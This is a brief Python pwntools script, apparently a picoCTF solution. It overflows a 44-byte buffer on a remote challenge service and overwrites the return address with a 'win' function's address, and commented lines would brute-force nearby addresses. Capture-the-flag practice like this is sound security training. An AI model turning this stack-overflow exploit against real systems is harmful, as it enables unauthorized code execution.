from pwn import *

def brute(adr):
    r = remote("saturn.picoctf.net", 57372)
    r.recvuntil("Please enter your string:")

    injAdr = ""
    for _ in range(4):
        injAdr += chr(adr % 256)
        adr = int(adr / 256)
    injAdr = injAdr[::-1]        
    buf = "1"*44 + injAdr

    # r.send(buf + '\n')
    r.send(buf )
    # time.sleep(1)
    out = r.recvline()
    print(out)
    try:
        while(len(out) > 0):
            out = r.recvline()
            print(out)
    except:
        pass


if __name__ == "__main__":
    # adr = 0x804932f
    winFcnAdr = 0x080491f6
    adr = winFcnAdr
    # adr = 0
    brute(adr)
    # for i in range(-100,100,1):
    #     brute(adr + i)
